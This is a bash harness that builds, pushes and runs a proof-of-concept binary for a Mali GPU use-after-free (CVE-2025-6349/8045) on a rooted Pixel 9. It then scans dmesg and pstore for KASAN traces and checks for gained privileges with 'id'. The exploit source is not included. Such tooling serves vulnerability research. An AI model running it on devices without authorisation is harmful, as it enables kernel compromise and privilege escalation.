#!/bin/bash
# Direct test script for CVE-2025-6349/8045 POC
# Run on rooted Pixel 9 (Tokay) with Android 16

set -e

POC_BIN="/data/local/tmp/mali_uaf_poc"
DEVICE_SERIAL=""

echo "=================================================="
echo "CVE-2025-6349/8045 Direct Test Script"
echo "Target: Google Pixel 9 (Tokay) - Android 16"
echo "=================================================="
echo ""

# Check if we're on the device or need adb
if [ -f /system/build.prop ]; then
    echo "[*] Running on-device"
    SHELL_CMD=""
else
    echo "[*] Running via ADB"
    if [ -n "$1" ]; then
        DEVICE_SERIAL="-s $1"
        echo "[*] Using device: $1"
    fi
    SHELL_CMD="adb $DEVICE_SERIAL shell"
fi

# Check device info
echo ""
echo "[*] Device info:"
$SHELL_CMD getprop ro.product.model 2>/dev/null || echo "  (unknown)"
$SHELL_CMD getprop ro.build.version.release 2>/dev/null || echo "  (unknown)"
$SHELL_CMD uname -a 2>/dev/null || echo "  (unknown)"

# Check kernel version and Mali driver
echo ""
echo "[*] Kernel and Mali driver check:"
$SHELL_CMD cat /proc/version 2>/dev/null
echo ""

# Check for Mali device
echo "[*] Checking for Mali device nodes:"
$SHELL_CMD ls -la /dev/mali* 2>/dev/null || echo "  No Mali device found"

# Check if we can access mali
echo ""
echo "[*] Testing Mali device access:"
if $SHELL_CMD test -c /dev/mali0 2>/dev/null; then
    echo "  /dev/mali0 exists"
elif $SHELL_CMD test -c /dev/mali 2>/dev/null; then
    echo "  /dev/mali exists"
else
    echo "  No Mali char device found - might not be Mali GPU"
    echo "  Trying to find GPU info..."
    $SHELL_CMD ls -la /dev/ | grep -iE "(gpu|mali|kbase)" || true
fi

# Check KASAN status
echo ""
echo "[*] Kernel debug features (KASAN/SLUB):"
$SHELL_CMD cat /proc/cmdline 2>/dev/null | tr ' ' '\n' | grep -iE "(kasan|slub|debug)" || echo "  (no debug flags found)"

# Clear dmesg before test
echo ""
echo "[*] Clearing dmesg..."
$SHELL_CMD dmesg -C 2>/dev/null || $SHELL_CMD su -c "dmesg -C" 2>/dev/null || echo "  (could not clear dmesg)"

# Check if POC binary exists, if not try to build
echo ""
if [ ! -f "$POC_BIN" ]; then
    echo "[*] POC binary not found at $POC_BIN"
    echo "[*] Attempting to build..."
    
    if [ -f /system/build.prop ]; then
        # On-device build attempt
        echo "[*] On-device build not supported in this script"
        echo "[*] Please build with Android NDK and push"
        exit 1
    else
        # Host build and push
        echo "[*] Building with Android NDK..."
        if [ -z "$ANDROID_NDK_HOME" ]; then
            echo "  ANDROID_NDK_HOME not set, trying default..."
            export ANDROID_NDK_HOME=$HOME/android-ndk-r26b
        fi
        
        if [ -f "$ANDROID_NDK_HOME/build/ndk-build" ]; then
            echo "  Using NDK: $ANDROID_NDK_HOME"
            make clean
            make
            if [ -f "./mali_uaf_poc" ]; then
                adb $DEVICE_SERIAL push ./mali_uaf_poc $POC_BIN
                adb $DEVICE_SERIAL shell chmod +x $POC_BIN
                echo "  Build and push successful"
            else
                echo "  Build failed"
                exit 1
            fi
        else
            echo "  Android NDK not found. Please set ANDROID_NDK_HOME"
            echo "  Or manually build with:"
            echo "    aarch64-linux-android34-clang -o mali_uaf_poc poc_cve_2025_6349_8045.c -lpthread"
            exit 1
        fi
    fi
else
    echo "[*] POC binary found: $POC_BIN"
fi

# Make sure it's executable
$SHELL_CMD chmod +x $POC_BIN 2>/dev/null

# Run the POC
echo ""
echo "=================================================="
echo "[*] Running POC..."
echo "=================================================="
echo ""

if [ -n "$SHELL_CMD" ]; then
    # ADB mode
    adb $DEVICE_SERIAL shell "cd /data/local/tmp && ./$POC_BIN" 2>&1 || true
else
    # On-device mode
    cd /data/local/tmp && ./$POC_BIN 2>&1 || true
fi

POC_EXIT=$?

echo ""
echo "=================================================="
echo "[*] POC exit code: $POC_EXIT"
echo "=================================================="

# Check dmesg for UAF indicators
echo ""
echo "[*] Checking dmesg for UAF indicators..."
echo ""

# Wait a moment for kernel logs to settle
sleep 1

# Extract relevant logs
if [ -n "$SHELL_CMD" ]; then
    adb $DEVICE_SERIAL shell "dmesg" 2>/dev/null | grep -iE "(kasan|use.after.free|double.free|slob|slab|mali|kbase)" | tail -100
else
    dmesg 2>/dev/null | grep -iE "(kasan|use.after.free|double.free|slob|slab|mali|kbase)" | tail -100
fi

echo ""
echo "[*] Checking for crash traces..."
if [ -n "$SHELL_CMD" ]; then
    adb $DEVICE_SERIAL shell "cat /sys/fs/pstore/console-ramoops 2>/dev/null || echo 'No pstore logs'"
else
    cat /sys/fs/pstore/console-ramoops 2>/dev/null || echo "No pstore logs"
fi

# Check if we got root (only relevant if exploit succeeded locally)
echo ""
echo "[*] Checking privileges..."
if [ -n "$SHELL_CMD" ]; then
    adb $DEVICE_SERIAL shell id 2>/dev/null
else
    id
fi

echo ""
echo "=================================================="
echo "Test complete. Review dmesg output above for:"
echo "  - 'kasan: slab-use-after-free' (UAF confirmed)"
echo "  - 'double-free' (double-free confirmed)"
echo "  - 'mali' or 'kbase' references"
echo "=================================================="

exit $POC_EXIT
